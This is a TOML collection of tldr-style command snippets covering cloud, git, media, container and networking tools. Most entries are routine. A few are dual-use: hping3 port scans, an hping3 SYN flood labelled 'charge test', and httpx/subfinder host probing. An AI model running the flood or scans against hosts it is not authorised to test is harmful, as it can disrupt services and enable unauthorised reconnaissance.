  command = "cmake -B build -DCMAKE_TOOLCHAIN_FILE=<path/to/vcpkg_install_directory>/scripts/buildsystems/vcpkg.cmake"
  output = ""

[[snippets]]
  description = "Convert a PPM image to a PICT file"
  command = "ppmtopict <path/to/file.ppm> > <path/to/file.pict>"
  output = ""

[[snippets]]
  description = "Create bucket in a specific region"
  command = "aws s3api create-bucket --bucket <bucket_name> --region <region> --create-bucket-configuration LocationConstraint=<region>"
  output = ""

[[snippets]]
  description = "Delete a bucket"
  command = "aws s3api delete-bucket --bucket <bucket_name>"
  output = ""

[[snippets]]
  description = "List buckets"
  command = "aws s3api list-buckets"
  output = ""

[[snippets]]
  description = "List the objects inside of a bucket and only show each object's key and size"
  command = "aws s3api list-objects --bucket <bucket_name> --query '<Contents[].{Key: Key, Size: Size>}'"
  output = ""

[[snippets]]
  description = "Add an object to a bucket"
  command = "aws s3api put-object --bucket <bucket_name> --key <object_key> --body <path/to/file>"
  output = ""

[[snippets]]
  description = "Download object from a bucket (The output file is always the last argument)"
  command = "aws s3api get-object --bucket <bucket_name> --key <object_key> <path/to/output_file>"
  output = ""

[[snippets]]
  description = "Apply an Amazon S3 bucket policy to a specified bucket"
  command = "aws s3api put-bucket-policy --bucket <bucket_name> --policy file://<path/to/bucket_policy.json>"
  output = ""

[[snippets]]
  description = "Download the Amazon S3 bucket policy from a specified bucket"
  command = "aws s3api get-bucket-policy --bucket <bucket_name> --query Policy --output <json|table|text|yaml|yaml-stream> > <path/to/bucket_policy>"
  output = ""

[[snippets]]
  description = "Launch a program with altered priority"
  command = "nice -n <niceness_value> <command>"
  output = ""

[[snippets]]
  description = "Display all information from YubiKey"
  command = "ykinfo -a"
  output = ""

[[snippets]]
  description = "Get only serial in decimal from YubiKey"
  command = "ykinfo -s -q"
  output = ""

[[snippets]]
  description = "Get capabilities from YubiKey"
  command = "ykinfo -c"
  output = ""

[[snippets]]
  description = "Launch the GUI"
  command = "anki"
  output = ""

[[snippets]]
  description = "Use a specific [p]rofile"
  command = "anki -p <profile_name>"
  output = ""

[[snippets]]
  description = "Use a specific [l]anguage"
  command = "anki -l <language>"
  output = ""

[[snippets]]
  description = "Use a non-default directory (`~/Anki` for default)"
  command = "anki -b <path/to/directory>"
  output = ""

[[snippets]]
  description = "Store Git credentials for a specific amount of time"
  command = "git config credential.helper 'cache --timeout=<time_in_seconds>'"
  output = ""

[[snippets]]
  description = "Log in with interactive prompt"
  command = "gh auth login"
  output = ""

[[snippets]]
  description = "Log in with a token from `stdin` (created in <https://github.com/settings/tokens>)"
  command = "echo <your_token> | gh auth login --with-token"
  output = ""

[[snippets]]
  description = "Check if you are logged in"
  command = "gh auth status"
  output = ""

[[snippets]]
  description = "Log out"
  command = "gh auth logout"
  output = ""

[[snippets]]
  description = "Log in with a specific GitHub Enterprise Server"
  command = "gh auth login --hostname <github.example.com>"
  output = ""

[[snippets]]
  description = "Refresh the session to ensure authentication credentials have the correct minimum scopes (removes additional scopes requested previously)"
  command = "gh auth refresh"
  output = ""

[[snippets]]
  description = "Expand the permission scopes"
  command = "gh auth refresh --scopes <repo,admin:repo_hook,admin:org,admin:public_key,admin:org_hook,...>"
  output = ""

[[snippets]]
  description = "Convert a bitcode file as LLVM IR and write the result to `stdout`"
  command = "llvm-dis <path/to/input.bc> -o -"
  output = ""

[[snippets]]
  description = "Convert a bitcode file to an LLVM IR file with the same filename"
  command = "llvm-dis <path/to/file.bc>"
  output = ""

[[snippets]]
  description = "Convert a bitcode file to LLVM IR, writing the result to the specified file"
  command = "llvm-dis <path/to/input.bc> -o <path/to/output.ll>"
  output = ""

[[snippets]]
  description = "Display an image on the command-line"
  command = "imgcat <path/to/file>"
  output = ""

[[snippets]]
  description = "Create a codespace in GitHub interactively"
  command = "gh codespace create"
  output = ""

[[snippets]]
  description = "List all available codespaces"
  command = "gh codespace list"
  output = ""

[[snippets]]
  description = "Connect to a codespace via SSH interactively"
  command = "gh codespace ssh"
  output = ""

[[snippets]]
  description = "Transfer a specific file to a codespace interactively"
  command = "gh codespace cp <path/to/source_file> remote:<path/to/remote_file>"
  output = ""

[[snippets]]
  description = "List the ports of a codespace interactively"
  command = "gh codespace ports"
  output = ""

[[snippets]]
  description = "Display the logs from a codespace interactively"
  command = "gh codespace logs"
  output = ""

[[snippets]]
  description = "Delete a codespace interactively"
  command = "gh codespace delete"
  output = ""

[[snippets]]
  description = "Display help for a subcommand"
  command = "gh codespace <code|cp|create|delete|edit|...> --help"
  output = ""

[[snippets]]
  description = "Launch an interactive menu to setup rclone"
  command = "rclone config"
  output = ""

[[snippets]]
  description = "List contents of a directory on an rclone remote"
  command = "rclone lsf <remote_name>:<path/to/directory>"
  output = ""

[[snippets]]
  description = "Copy a file or directory from the local machine to the remote destination"
  command = "rclone copy <path/to/source_file_or_directory> <remote_name>:<path/to/directory>"
  output = ""

[[snippets]]
  description = "Copy files changed within the past 24 hours to a remote from the local machine, asking the user to confirm each file"
  command = "rclone copy --interactive --max-age 24h <remote_name>:<path/to/directory> <path/to/local_directory> "
  output = ""

[[snippets]]
  description = "Mirror a specific file or directory (Note: Unlike copy, sync removes files from the remote if it does not exist locally)"
  command = "rclone sync <path/to/file_or_directory> <remote_name>:<path/to/directory>"
  output = ""

[[snippets]]
  description = "Delete a remote file or directory (Note: `--dry-run` means test, remove it from the command to actually delete)"
  command = "rclone --dry-run delete <remote_name>:<path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Mount rclone remote (experimental)"
  command = "rclone mount <remote_name>:<path/to/directory> <path/to/mount_point>"
  output = ""

[[snippets]]
  description = "Unmount rclone remote if CTRL-C fails (experimental)"
  command = "fusermount -u <path/to/mount_point>"
  output = ""

[[snippets]]
  description = "Read a PBM file as input and produce an ASCII output"
  command = "pbmtoascii <path/to/input_file.pbm>"
  output = ""

[[snippets]]
  description = "Read a PBM file as input and save an ASCII output into a file"
  command = "pbmtoascii <path/to/input_file.pbm> > <path/to/output_file>"
  output = ""

[[snippets]]
  description = "Read a PBM file as input while setting the pixel mapping (defaults to 1x2)"
  command = "pbmtoascii -<1x2|2x4> <path/to/input_file.pbm>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "pbmtoascii -version"
  output = ""

[[snippets]]
  description = "Download a URL to a file"
  command = "axel <url>"
  output = ""

[[snippets]]
  description = "Download and specify an [o]utput file"
  command = "axel <url> -o <path/to/file>"
  output = ""

[[snippets]]
  description = "Download with a specific [n]umber connections"
  command = "axel -n <connections_num> <url>"
  output = ""

[[snippets]]
  description = "[S]earch for mirrors"
  command = "axel -S <mirrors_num> <url>"
  output = ""

[[snippets]]
  description = "Limit download [s]peed (bytes per second)"
  command = "axel -s <speed> <url>"
  output = ""

[[snippets]]
  description = "Start an interactive `yacas` session"
  command = "yacas"
  output = ""

[[snippets]]
  description = "While in a `yacas` session, execute a statement"
  command = "<Integrate(x)Cos(x)>;"
  output = ""

[[snippets]]
  description = "While in a `yacas` session, display an example"
  command = "<Example()>;"
  output = ""

[[snippets]]
  description = "Quit from a `yacas` session"
  command = "<quit>"
  output = ""

[[snippets]]
  description = "Execute one or more `yacas` scripts (without terminal or prompts), then exit"
  command = "yacas -p -c <path/to/script1> <path/to/script2>"
  output = ""

[[snippets]]
  description = "Execute and print the result of one statement, then exit"
  command = "echo ""<Echo( Deriv(x)Cos(1/x) );>"" | yacas -p -c /dev/stdin"
  output = ""

[[snippets]]
  description = "Convert a PPM image to DEC sixel format"
  command = "ppmtosixel <path/to/file.ppm> > <path/to/file.sixel>"
  output = ""

[[snippets]]
  description = "Produce an uncompressed SIXEL file that is much slower to print"
  command = "ppmtosixel -raw <path/to/file.ppm> > <path/to/file.sixel>"
  output = ""

[[snippets]]
  description = "Add a left margin of 1.5 inches"
  command = "ppmtosixel -margin <path/to/file.ppm> > <path/to/file.sixel>"
  output = ""

[[snippets]]
  description = "Encode control codes in a more portable (although less space-efficient) way"
  command = "ppmtosixel -7bit <path/to/file.ppm> > <path/to/file.sixel>"
  output = ""

[[snippets]]
  description = "Connect to Tailscale"
  command = "sudo tailscale up"
  output = ""

[[snippets]]
  description = "Disconnect from Tailscale"
  command = "sudo tailscale down"
  output = ""

[[snippets]]
  description = "Display the current Tailscale IP addresses"
  command = "tailscale ip"
  output = ""

[[snippets]]
  description = "Ping a peer node at the Tailscale layer and display which route it took for each response"
  command = "tailscale ping <ip|hostname>"
  output = ""

[[snippets]]
  description = "Analyze the local network conditions and display the result"
  command = "tailscale netcheck"
  output = ""

[[snippets]]
  description = "Start a web server for controlling Tailscale"
  command = "tailscale web"
  output = ""

[[snippets]]
  description = "Display a shareable identifier to help diagnose issues"
  command = "tailscale bugreport"
  output = ""

[[snippets]]
  description = "Display help for a subcommand"
  command = "tailscale <subcommand> --help"
  output = ""

[[snippets]]
  description = "Render a `png` image with a filename based on the input filename and output format (uppercase -O)"
  command = "circo -T <png> -O <path/to/input.gv>"
  output = ""

[[snippets]]
  description = "Render a `svg` image with the specified output filename (lowercase -o)"
  command = "circo -T <svg> -o <path/to/image.svg> <path/to/input.gv>"
  output = ""

[[snippets]]
  description = "Render the output in `ps`, `pdf`, `svg`, `fig`, `png`, `gif`, `jpg`, `json`, or `dot` format"
  command = "circo -T <format> -O <path/to/input.gv>"
  output = ""

[[snippets]]
  description = "Render a `gif` image using `stdin` and `stdout`"
  command = "echo ""<digraph {this -> that} >"" | circo -T <gif> > <path/to/image.gif>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "circo -?"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr netlify"
  output = ""

[[snippets]]
  description = "List IAM grantable roles for a resource"
  command = "gcloud iam list-grantable-roles <resource>"
  output = ""

[[snippets]]
  description = "Create a custom role for a organization or project"
  command = "gcloud iam roles create <role_name> --<organization|project> <organization|project_id> --file <path/to/role.yaml>"
  output = ""

[[snippets]]
  description = "Create a service account for a project"
  command = "gcloud iam service-accounts create <name>"
  output = ""

[[snippets]]
  description = "Add an IAM policy binding to a service account"
  command = "gcloud iam service-accounts add-iam-policy-binding <service_account_email> --member <member> --role <role>"
  output = ""

[[snippets]]
  description = "Replace existing IAM policy binding"
  command = "gcloud iam service-accounts set-iam-policy <service_account_email> <policy_file>"
  output = ""

[[snippets]]
  description = "List a service account's keys"
  command = "gcloud iam service-accounts keys list --iam-account <service_account_email>"
  output = ""

[[snippets]]
  description = "Start the text-based installer (default on Unix systems)"
  command = "install-tl -no-gui"
  output = ""

[[snippets]]
  description = "Start the GUI installer (default on macOS and Windows, requires Tcl/Tk)"
  command = "install-tl -gui"
  output = ""

[[snippets]]
  description = "Install TeX Live as defined in a specific profile file"
  command = "install-tl -profile <path/to/texlive.profile>"
  output = ""

[[snippets]]
  description = "Start the installer with the settings from a specific profile file"
  command = "install-tl -init-from-file <path/to/texlive.profile>"
  output = ""

[[snippets]]
  description = "Start the installer for installation on a portable device, like a USB stick"
  command = "install-tl -portable"
  output = ""

[[snippets]]
  description = "Display help"
  command = "install-tl -help"
  output = ""

[[snippets]]
  description = "Convert an SBIG CCDOPS image file to PGM"
  command = "sbigtopgm <path/to/input_file.sbig> > <path/to/output.pgm>"
  output = ""

[[snippets]]
  description = "Send the last commit in the current branch"
  command = "git send-email -1"
  output = ""

[[snippets]]
  description = "Send a given commit"
  command = "git send-email -1 <commit>"
  output = ""

[[snippets]]
  description = "Send multiple (e.g. 10) commits in the current branch"
  command = "git send-email <-10>"
  output = ""

[[snippets]]
  description = "Send an introductory email message for the patch series"
  command = "git send-email -<number_of_commits> --compose"
  output = ""

[[snippets]]
  description = "Review and edit the email message for each patch you're about to send"
  command = "git send-email -<number_of_commits> --annotate"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr pamtopnm"
  output = ""

[[snippets]]
  description = "Set the default printer"
  command = "lpadmin -d <printer>"
  output = ""

[[snippets]]
  description = "Delete a specific printer or class"
  command = "lpadmin -x <printer|class>"
  output = ""

[[snippets]]
  description = "Add a printer to a class"
  command = "lpadmin -p <printer> -c <class>"
  output = ""

[[snippets]]
  description = "Remove a printer from a class"
  command = "lpadmin -p <printer> -r <class>"
  output = ""

[[snippets]]
  description = "Run an nginx pod and expose port 80"
  command = "kubectl run <nginx-dev> --image=nginx --port 80"
  output = ""

[[snippets]]
  description = "Run an nginx pod, setting the TEST_VAR environment variable"
  command = "kubectl run <nginx-dev> --image=nginx --env=""<TEST_VAR>=<testing>"""
  output = ""

[[snippets]]
  description = "Show API calls that would be made to create an nginx container"
  command = "kubectl run <nginx-dev> --image=nginx --dry-run=<none|server|client>"
  output = ""

[[snippets]]
  description = "Run an Ubuntu pod interactively, never restart it, and remove it when it exits"
  command = "kubectl run <temp-ubuntu> --image=ubuntu:22.04 --restart=Never --rm -- /bin/bash"
  output = ""

[[snippets]]
  description = "Run an Ubuntu pod, overriding the default command with echo, and specifying custom arguments"
  command = "kubectl run <temp-ubuntu> --image=ubuntu:22.04 --command -- echo <argument1 argument2 ...>"
  output = ""

[[snippets]]
  description = "Convert a PICT file to a PPM image"
  command = "picttoppm <path/to/file.pict> > <path/to/file.ppm>"
  output = ""

[[snippets]]
  description = "Force any images in the PICT file to be output at full resolution"
  command = "picttoppm -fullres <path/to/file.pict> > <path/to/file.ppm>"
  output = ""

[[snippets]]
  description = "Do not assume that the input file contains a PICT header and execute quickdraw operations only"
  command = "picttoppm -noheader -quickdraw <path/to/file.pict> > <path/to/file.ppm>"
  output = ""

[[snippets]]
  description = "Ping a destination with 4 ICMP ping requests"
  command = "hping3 --icmp --count <4> <ip_or_hostname>"
  output = ""

[[snippets]]
  description = "Ping an IP address over UDP on port 80"
  command = "hping3 --udp --destport <80> --syn <ip_or_hostname>"
  output = ""

[[snippets]]
  description = "Scan TCP port 80, scanning from the specific local source port 5090"
  command = "hping3 --verbose --syn --destport <80> --baseport <5090> <ip_or_hostname>"
  output = ""

[[snippets]]
  description = "Traceroute using a TCP scan to a specific destination port"
  command = "hping3 --traceroute --verbose --syn --destport <80> <ip_or_hostname>"
  output = ""

[[snippets]]
  description = "Scan a set of TCP ports on a specific IP address"
  command = "hping3 --scan <80,3000,9000> --syn <ip_or_hostname>"
  output = ""

[[snippets]]
  description = "Perform a TCP ACK scan to check if a given host is alive"
  command = "hping3 --count <2> --verbose --destport <80> --ack <ip_or_hostname>"
  output = ""

[[snippets]]
  description = "Perform a charge test on port 80"
  command = "hping3 --flood --destport <80> --syn <ip_or_hostname>"
  output = ""

[[snippets]]
  description = "Get an IP address for the `eth0` interface"
  command = "sudo dhclient <eth0>"
  output = ""

[[snippets]]
  description = "Release an IP address for the `eth0` interface"
  command = "sudo dhclient -r <eth0>"
  output = ""

[[snippets]]
  description = "Run a JavaScript or TypeScript file"
  command = "deno run <path/to/file.ts>"
  output = ""

[[snippets]]
  description = "Start a REPL (interactive shell)"
  command = "deno"
  output = ""

[[snippets]]
  description = "Run a file with network access enabled"
  command = "deno run --allow-net <path/to/file.ts>"
  output = ""

[[snippets]]
  description = "Run a file from a URL"
  command = "deno run <https://deno.land/std/examples/welcome.ts>"
  output = ""

[[snippets]]
  description = "Install an executable script from a URL"
  command = "deno install <https://deno.land/std/examples/colors.ts>"
  output = ""

[[snippets]]
  description = "Show disk I/O latency using the default values and the current directory"
  command = "ioping ."
  output = ""

[[snippets]]
  description = "Measure latency on /tmp using 10 requests of 1 megabyte each"
  command = "ioping -c 10 -s 1M /tmp"
  output = ""

[[snippets]]
  description = "Measure disk seek rate on `/dev/sdX`"
  command = "ioping -R </dev/sdX>"
  output = ""

[[snippets]]
  description = "Measure disk sequential speed on `/dev/sdX`"
  command = "ioping -RL </dev/sdX>"
  output = ""

[[snippets]]
  description = "Generate scaffolding for a new project based on a template"
  command = "lein new <template_name> <project_name>"
  output = ""

[[snippets]]
  description = "Start a REPL session either with the project or standalone"
  command = "lein repl"
  output = ""

[[snippets]]
  description = "Run the project's `-main` function with optional args"
  command = "lein run <args>"
  output = ""

[[snippets]]
  description = "Run the project's tests"
  command = "lein test"
  output = ""

[[snippets]]
  description = "Package up the project files and all its dependencies into a jar file"
  command = "lein uberjar"
  output = ""

[[snippets]]
  description = "Convert a PNG to a vector image format"
  command = "vectorize-pixelart <path/to/input.png> <path/to/output.svg|.eps>"
  output = ""

[[snippets]]
  description = "Return all nodes (tags) named "foo""
  command = "xmllint --xpath ""//<foo>"" <source_file.xml>"
  output = ""

[[snippets]]
  description = "Return the contents of the first node named "foo" as a string"
  command = "xmllint --xpath ""string(//<foo>)"" <source_file.xml>"
  output = ""

[[snippets]]
  description = "Return the href attribute of the second anchor element in an HTML file"
  command = "xmllint --html --xpath ""string(//a[2]/@href)"" webpage.xhtml"
  output = ""

[[snippets]]
  description = "Return human-readable (indented) XML from file"
  command = "xmllint --format <source_file.xml>"
  output = ""

[[snippets]]
  description = "Check that an XML file meets the requirements of its DOCTYPE declaration"
  command = "xmllint --valid <source_file.xml>"
  output = ""

[[snippets]]
  description = "Validate XML against DTD schema hosted online"
  command = "xmllint --dtdvalid <URL> <source_file.xml>"
  output = ""

[[snippets]]
  description = "Display statistics for a PDF file"
  command = "pdf-parser --stats <path/to/file.pdf>"
  output = ""

[[snippets]]
  description = "Display objects of type `/Font` in a PDF file"
  command = "pdf-parser --type=</Font> <path/to/file.pdf>"
  output = ""

[[snippets]]
  description = "Search for strings in indirect objects"
  command = "pdf-parser --search=<search_string> <path/to/file.pdf>"
  output = ""

[[snippets]]
  description = "List all running containers"
  command = "podman-compose ps"
  output = ""

[[snippets]]
  description = "Create and start all containers in the background using a local `docker-compose.yml`"
  command = "podman-compose up -d"
  output = ""

[[snippets]]
  description = "Start all containers, building if needed"
  command = "podman-compose up --build"
  output = ""

[[snippets]]
  description = "Start all containers using an alternate compose file"
  command = "podman-compose <path/to/file> up"
  output = ""

[[snippets]]
  description = "Stop all running containers"
  command = "podman-compose stop"
  output = ""

[[snippets]]
  description = "Remove all containers, networks, and volumes"
  command = "podman-compose down --volumes"
  output = ""

[[snippets]]
  description = "Follow logs for a container (omit all container names)"
  command = "podman-compose logs --follow <container_name>"
  output = ""

[[snippets]]
  description = "Run a one-time command in a service with no ports mapped"
  command = "podman-compose run <service_name> <command>"
  output = ""

[[snippets]]
  description = "Start reading top-level directory menu"
  command = "info"
  output = ""

[[snippets]]
  description = "Start reading at given menu item node from top-level directory"
  command = "info <menu_item>"
  output = ""

[[snippets]]
  description = "Start reading at second menu item within first menu item manual"
  command = "info <first_menu_item> <second_menu_item>"
  output = ""

[[snippets]]
  description = "Search for extended regular expressions (supporting `?`, `+`, `{}`, `()` and `|`) in a compressed file (case-sensitive)"
  command = "zegrep ""<search_pattern>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Search for extended regular expressions (supporting `?`, `+`, `{}`, `()` and `|`) in a compressed file (case-insensitive)"
  command = "zegrep --ignore-case ""<search_pattern>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Search for lines that do not match a pattern"
  command = "zegrep --invert-match ""<search_pattern>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Print file name and line number for each match"
  command = "zegrep --with-filename --line-number ""<search_pattern>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Search for lines matching a pattern, printing only the matched text"
  command = "zegrep --only-matching ""<search_pattern>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Recursively search files in a compressed file for a pattern"
  command = "zegrep --recursive ""<search_pattern>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Print a horizontal rule"
  command = "hr"
  output = ""

[[snippets]]
  description = "Print a horizontal rule with a custom string"
  command = "hr <string>"
  output = ""

[[snippets]]
  description = "Print a multiline horizontal rule"
  command = "hr <string1 string2 ...>"
  output = ""

[[snippets]]
  description = "Display `gcloud` environment information"
  command = "gcloud info"
  output = ""

[[snippets]]
  description = "Check network connectivity and hidden properties"
  command = "gcloud info --run-diagnostics"
  output = ""

[[snippets]]
  description = "Print the contents of the most recent log file"
  command = "gcloud info --show-log"
  output = ""

[[snippets]]
  description = "Convert the specified Usenix FaceSaver file into a PGM image"
  command = "fstopgm <path/to/input.fs> > <path/to/output.pgm>"
  output = ""

[[snippets]]
  description = "Install a module globally"
  command = "yarn global add <module_name>"
  output = ""

[[snippets]]
  description = "Install all dependencies referenced in the `package.json` file (the `install` is optional)"
  command = "yarn install"
  output = ""

[[snippets]]
  description = "Install a module and save it as a dependency to the `package.json` file (add `--dev` to save as a dev dependency)"
  command = "yarn add <module_name>@<version>"
  output = ""

[[snippets]]
  description = "Uninstall a module and remove it from the `package.json` file"
  command = "yarn remove <module_name>"
  output = ""

[[snippets]]
  description = "Interactively create a `package.json` file"
  command = "yarn init"
  output = ""

[[snippets]]
  description = "Identify whether a module is a dependency and list other modules that depend upon it"
  command = "yarn why <module_name>"
  output = ""

[[snippets]]
  description = "Open pyATS shell with a defined Testbed file"
  command = "pyats shell --testbed-file <path/to/testbed.yaml>"
  output = ""

[[snippets]]
  description = "Open pyATS shell with a defined Pickle file"
  command = "pyats shell --pickle-file <path/to/pickle.file>"
  output = ""

[[snippets]]
  description = "Open pyATS with IPython disabled"
  command = "pyats shell --no-ipython"
  output = ""

[[snippets]]
  description = "Display Java version by using coursier"
  command = "cs java -version"
  output = ""

[[snippets]]
  description = "Call a specific Java version with custom properties using coursier"
  command = "cs java --jvm <jvm_name>:<jvm_version> -Xmx32m -X<another_jvm_opt> -jar <path/to/jar_name.jar>"
  output = ""

[[snippets]]
  description = "List all the available JVM in the coursier default index"
  command = "cs java --available"
  output = ""

[[snippets]]
  description = "List all the installed JVM in the system with his own location"
  command = "cs java --installed"
  output = ""

[[snippets]]
  description = "Set a specific JVM as one-off default for the shell instance"
  command = "cs java --jvm <jvm_name>:<jvm_version> --env"
  output = ""

[[snippets]]
  description = "Revert the changes for the default JVM settings"
  command = "eval ""$(cs java --disable)"""
  output = ""

[[snippets]]
  description = "Set a specific JVM as default for the whole system"
  command = "cs java --jvm <jvm_name>:<jvm_version> --setup"
  output = ""

[[snippets]]
  description = "Process an image file"
  command = "zbarimg <image_file>"
  output = ""

[[snippets]]
  description = "Decrypt text after a keystroke"
  command = "echo ""<Hello, World!>"" | nms"
  output = ""

[[snippets]]
  description = "Decrypt output immediately, without waiting for a keystroke"
  command = "<ls -la> | nms -a"
  output = ""

[[snippets]]
  description = "Decrypt the content of a file, with a custom output color"
  command = "cat <path/to/file> | nms -a -f <blue|white|yellow|black|magenta|green|red>"
  output = ""

[[snippets]]
  description = "Clear the screen before decrypting"
  command = "<command> | nms -a -c"
  output = ""

[[snippets]]
  description = "Import a JSON file into a specific collection"
  command = "mongoimport --file=<path/to/file.json> --uri=<mongodb_uri> --collection=<collection_name>"
  output = ""

[[snippets]]
  description = "Import a CSV file, using the first line of the file to determine field names"
  command = "mongoimport --type=<csv> --file=<path/to/file.csv> --db=<database_name> --collection=<collection_name>"
  output = ""

[[snippets]]
  description = "Import a JSON array, using each element as a separate document"
  command = "mongoimport --jsonArray --file=<path/to/file.json>"
  output = ""

[[snippets]]
  description = "Import a JSON file using a specific mode and a query to match existing documents"
  command = "mongoimport --file=<path/to/file.json> --mode=<delete|merge|upsert> --upsertFields=""<field1,field2,...>"""
  output = ""

[[snippets]]
  description = "Import a CSV file, reading field names from a separate CSV file and ignoring fields with empty values"
  command = "mongoimport --type=<csv> --file=<path/to/file.csv> --fieldFile=<path/to/field_file.csv> --ignoreBlanks"
  output = ""

[[snippets]]
  description = "Display help"
  command = "mongoimport --help"
  output = ""

[[snippets]]
  description = "View network settings of an Ethernet adapter"
  command = "ifconfig eth0"
  output = ""

[[snippets]]
  description = "Display details of all interfaces, including disabled interfaces"
  command = "ifconfig -a"
  output = ""

[[snippets]]
  description = "Disable eth0 interface"
  command = "ifconfig eth0 down"
  output = ""

[[snippets]]
  description = "Enable eth0 interface"
  command = "ifconfig eth0 up"
  output = ""

[[snippets]]
  description = "Assign IP address to eth0 interface"
  command = "ifconfig eth0 <ip_address>"
  output = ""

[[snippets]]
  description = "Create a new Lumen application"
  command = "lumen new <application_name>"
  output = ""

[[snippets]]
  description = "List the available installer commands"
  command = "lumen list"
  output = ""

[[snippets]]
  description = "Scan an image"
  command = "trivy image <image:tag>"
  output = ""

[[snippets]]
  description = "Scan the filesystem for vulnerabilities and misconfigurations"
  command = "trivy fs --security-checks <vuln,config> <path/to/project_directory>"
  output = ""

[[snippets]]
  description = "Scan a directory for misconfigurations"
  command = "trivy config <path/to/iac_directory>"
  output = ""

[[snippets]]
  description = "Generate output with a SARIF template"
  command = "trivy image --format <template> --template <""@sarif.tpl""> -o <path/to/report.sarif> <image:tag>"
  output = ""

[[snippets]]
  description = "Display the running processes of a container"
  command = "docker top <container>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "docker top --help"
  output = ""

[[snippets]]
  description = "Play the specified file or URL"
  command = "mplayer <path/to/file|url>"
  output = ""

[[snippets]]
  description = "Play multiple files"
  command = "mplayer <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Play a specific file repeatedly"
  command = "mplayer -loop <0> <path/to/file>"
  output = ""

[[snippets]]
  description = "Pause playback"
  command = "<Space>"
  output = ""

[[snippets]]
  description = "Quit mplayer"
  command = "<Esc>"
  output = ""

[[snippets]]
  description = "Seek backward or forward 10 seconds"
  command = "<Left|Right>"
  output = ""

[[snippets]]
  description = "Create a new package"
  command = "stack new <package> <template>"
  output = ""

[[snippets]]
  description = "Compile a package"
  command = "stack build"
  output = ""

[[snippets]]
  description = "Run tests inside a package"
  command = "stack test"
  output = ""

[[snippets]]
  description = "Compile a project and re-compile every time a file changes"
  command = "stack build --file-watch"
  output = ""

[[snippets]]
  description = "Compile a project and execute a command after compilation"
  command = "stack build --exec ""<command>"""
  output = ""

[[snippets]]
  description = "Run a program and pass an argument to it"
  command = "stack exec <program> -- <argument>"
  output = ""

[[snippets]]
  description = "Launch JOSM"
  command = "josm"
  output = ""

[[snippets]]
  description = "Launch JOSM in maximized mode"
  command = "josm --maximize"
  output = ""

[[snippets]]
  description = "Launch JOSM and set a specific language"
  command = "josm --language <de>"
  output = ""

[[snippets]]
  description = "Launch JOSM and reset all preferences to their default values"
  command = "josm --reset-preferences"
  output = ""

[[snippets]]
  description = "Launch JOSM and download a specific bounding box"
  command = "josm --download <minlat,minlon,maxlat,maxlon>"
  output = ""

[[snippets]]
  description = "Launch JOSM and download a specific bounding box as raw GPS"
  command = "josm --downloadgps <minlat,minlon,maxlat,maxlon>"
  output = ""

[[snippets]]
  description = "Launch JOSM without plugins"
  command = "josm --skip-plugins"
  output = ""

[[snippets]]
  description = "Open a URL"
  command = "w3m <https://example.com>"
  output = ""

[[snippets]]
  description = "Open a URL in monochrome mode"
  command = "w3m <https://example.com> -M"
  output = ""

[[snippets]]
  description = "Open a URL without mouse support"
  command = "w3m <https://example.com> -no-mouse"
  output = ""

[[snippets]]
  description = "Open a new browser tab"
  command = "<Shift> + T"
  output = ""

[[snippets]]
  description = "Display your browser history"
  command = "<Ctrl> + H"
  output = ""

[[snippets]]
  description = "Quit w3m"
  command = "q + y"
  output = ""

[[snippets]]
  description = "List all running containers"
  command = "docker compose ps"
  output = ""

[[snippets]]
  description = "Create and start all containers in the background using a `docker-compose.yml` file from the current directory"
  command = "docker compose up --detach"
  output = ""

[[snippets]]
  description = "Start all containers, rebuild if necessary"
  command = "docker compose up --build"
  output = ""

[[snippets]]
  description = "Start all containers by specifying a project name and using an alternate compose file"
  command = "docker compose -p <project_name> --file <path/to/file> up"
  output = ""

[[snippets]]
  description = "Stop all running containers"
  command = "docker compose stop"
  output = ""

[[snippets]]
  description = "Stop and remove all containers, networks, images, and volumes"
  command = "docker compose down --rmi all --volumes"
  output = ""

[[snippets]]
  description = "Follow logs for all containers"
  command = "docker compose logs --follow"
  output = ""

[[snippets]]
  description = "Follow logs for a specific container"
  command = "docker compose logs --follow <container_name>"
  output = ""

[[snippets]]
  description = "Define a property (like compute/zone) for the current configuration"
  command = "gcloud config set <property> <value>"
  output = ""

[[snippets]]
  description = "Fetch the value of a `gcloud` property"
  command = "gcloud config get <property>"
  output = ""

[[snippets]]
  description = "Display all the properties for the current configuration"
  command = "gcloud config list"
  output = ""

[[snippets]]
  description = "Create a new configuration with a given name"
  command = "gcloud config configurations create <configuration_name>"
  output = ""

[[snippets]]
  description = "Display a list of all available configurations"
  command = "gcloud config configurations list"
  output = ""

[[snippets]]
  description = "Switch to an existing configuration with a given name"
  command = "gcloud config configurations activate <configuration_name>"
  output = ""

[[snippets]]
  description = "Run a probe against a [u]RL, host, IP Address or subnet (CIDR notation) showing probe status"
  command = "httpx -probe -u <url|host|ipaddress|subnet_with_cidr>"
  output = ""

[[snippets]]
  description = "Run a probe against multiple hosts showing [s]tatus [c]ode with input from `subfinder`"
  command = "subfinder -d <example.com> | httpx -sc"
  output = ""

[[snippets]]
  description = "Run a [r]ate [l]imited probe against a [l]ist of hosts from a file showing [t]echnology [d]etected and [r]esponse [t]ime"
  command = "httpx -rl <150> -l <path/to/newline_separated_hosts_list> -td -rt"
  output = ""

[[snippets]]
  description = "Run a probe against a [u]RL showing its webpage title, CDN/WAF in use, and page content hash"
  command = "httpx -u <url> -title -cdn -hash <sha256>"
  output = ""

[[snippets]]
  description = "Run a probe against a list of hosts with custom defined [p]orts and timeout after certain seconds"
  command = "httpx -probe -u <host1,host2,...> -p http:<80,8000-8080>,https:<443,8443> -timeout <10>"
  output = ""

[[snippets]]
  description = "Run a probe against a list of hosts [f]iltering out [c]odes of certain responses"
  command = "httpx -u <host1,host2,...> -fc <400,401,404>"
  output = ""

[[snippets]]
  description = "Run a probe against a list of hosts [m]atching [c]odes of certain responses"
  command = "httpx -u <host1,host2,...> -mc <200,301,304>"
  output = ""

[[snippets]]
